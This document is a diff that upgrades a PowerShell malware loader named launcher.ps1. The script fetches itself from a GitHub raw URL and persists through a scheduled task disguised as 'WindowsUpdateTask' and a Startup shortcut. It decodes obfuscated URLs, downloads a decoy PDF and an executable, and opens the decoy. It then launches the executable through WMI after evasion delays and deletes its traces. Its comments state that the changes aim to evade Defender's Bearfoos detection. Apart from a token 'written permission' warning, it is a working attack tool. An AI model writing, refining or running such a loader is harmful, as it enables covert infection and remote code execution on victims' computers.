@@ -1,74 +1,139 @@
-# launcher.ps1 - Self-persistence + Bearfoos evasion
+# launcher.ps1 - Bearfoos Evasion + Redundant Persistence (Scheduled Task + Startup LNK)
+# WARNING: Use only on systems you own or have explicit written permission to test.
+
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === Ensure script is saved to disk ===
+# === SELF-PRESERVATION: Ensure script is saved to disk ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
-# If running from memory or temp location, save ourselves to disk
-if (-not $currentPath -or $currentPath -eq $null -or $currentPath -eq "") {
-    # We are running from memory (iex download) - capture the script content
-    $scriptContent = @'
-# (The entire script content - but we can't embed itself easily)
-# Instead, re-download and save
-'@
-    # Simpler: re-download and save to disk
-    $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadString($rawUrl) | Out-File -FilePath $localPath -Encoding UTF8
-    $scriptPath = $localPath
-} else {
-    $scriptPath = $currentPath
-    # If we're not already in the cache folder, copy there
-    if ($scriptPath -ne $localPath) {
-        Copy-Item -Path $scriptPath -Destination $localPath -Force
-        $scriptPath = $localPath
+function Save-ScriptToDisk {
+    param([string]$Destination)
+    # Create directory if missing
+    $dir = Split-Path $Destination -Parent
+    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    # If running from memory or temp location, re-download from GitHub (fallback)
+    if (-not $currentPath -or $currentPath -eq '') {
+        try {
+            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
+            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
+        } catch {
+            # If download fails, we can't persist - exit gracefully
+            exit
+        }
+    } else {
+        Copy-Item -Path $currentPath -Destination $Destination -Force
     }
+    return $Destination
 }
+$scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Install once (using Scheduled Task - more reliable) ===
+# === PERSISTENCE: Scheduled Task (primary) ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-    $trigger = New-ScheduledTaskTrigger -AtLogOn -User (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
+    # Trigger: runs at every user logon
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    # Action: base64-encoded command to reduce command-line footprint
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
+    # Settings: hidden, start when available, stop after 1 hour max
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
+    # Register task for current user (no admin required)
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-    # Make task truly hidden by removing SD
-    $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
-    if (Test-Path $taskPath) {
-        Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction SilentlyContinue
-    }
+    # Attempt to remove SecurityDescriptor (requires admin; fails silently otherwise)
+    try {
+        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
+        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
+    } catch {}
 }
 
-# === ORIGINAL LOADER (download PDF and EXE, launch with delay) ===
-Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)
+# === PERSISTENCE: Startup Folder LNK (backup) ===
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
+if (-not (Test-Path $lnkPath)) {
+    $wshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $wshShell.CreateShortcut($lnkPath)
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $shortcut.WindowStyle = 7  # Minimized
+    $shortcut.Save()
+}
+
+# === MAIN PAYLOAD: Download and execute with evasion ===
+# Random initial delay (2-8 seconds) + additional 20-30 seconds after logon for network stability
+Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
+Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)
 
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
+# Base64-encoded URLs
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
 $pdfPath = "$cache\doc.pdf"
 $exePath = "$cache\helper.exe"
 
-$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
-Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
-try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
-try { Start-Process $pdfPath } catch {}
+# Headers to mimic legitimate browser
+$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
-Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
-try {
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.Run("`"$exePath`"", 0, $false)
-} catch {
-    Start-Process $exePath -WindowStyle Hidden
+# Download PDF (only if missing to reduce network noise)
+if (-not (Test-Path $pdfPath)) {
+    try {
+        Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
+    } catch {}
 }
 
-# Cleanup after 5 minutes
+# Short pause between downloads
+Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
+
+# Download EXE (only if missing, with retry logic)
+if (-not (Test-Path $exePath)) {
+    $retryCount = 0
+    $maxRetries = 3
+    do {
+        try {
+            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+            break
+        } catch {
+            $retryCount++
+            Start-Sleep -Seconds 5
+        }
+    } while ($retryCount -lt $maxRetries)
+}
+
+# Open PDF decoy (if downloaded)
+if (Test-Path $pdfPath) {
+    try { Start-Process $pdfPath } catch {}
+}
+
+# Long delay before launching EXE to evade behavioral analysis (45-90 seconds)
+Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
+
+# Launch EXE using WMI process creation to obscure parent-child relationship
+if (Test-Path $exePath) {
+    try {
+        # Use WMI for a cleaner process tree (parent becomes WmiPrvSE.exe)
+        $wmiParams = @{
+            ComputerName = $env:COMPUTERNAME
+            CommandLine  = "`"$exePath`""
+        }
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
+    } catch {
+        # Fallback to WScript.Shell or Start-Process
+        try {
+            $wsh = New-Object -ComObject WScript.Shell
+            $wsh.Run("`"$exePath`"", 0, $false)
+        } catch {
+            Start-Process $exePath -WindowStyle Hidden
+        }
+    }
+}
+
+# === CLEANUP: Remove EXE and PDF after 5 minutes (reduce forensic footprint) ===
 Start-Job -ScriptBlock {
+    param($exe, $pdf)
     Start-Sleep -Seconds 300
-    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $args[1] -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $pdf -Force -ErrorAction SilentlyContinue
 } -ArgumentList $exePath, $pdfPath | Out-Null
